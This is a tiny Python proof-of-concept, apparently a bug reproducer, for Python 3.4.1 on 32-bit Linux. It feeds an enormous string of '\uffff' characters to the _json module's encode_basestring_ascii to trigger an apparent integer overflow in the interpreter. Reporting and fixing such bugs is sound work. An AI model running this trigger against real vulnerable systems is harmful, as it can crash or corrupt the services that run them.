# 
# % ./python -V
# Python 3.4.1
#  
# % uname -a
# Linux ubuntu 3.8.0-29-generic #42~precise1-Ubuntu SMP Wed Aug 14 15:31:16 UTC 2013 i686 i686 i386 GNU/Linux
#  
 
from _json import encode_basestring_ascii as enc
s="\uffff"*int((2**32)/6+1)
enc(s)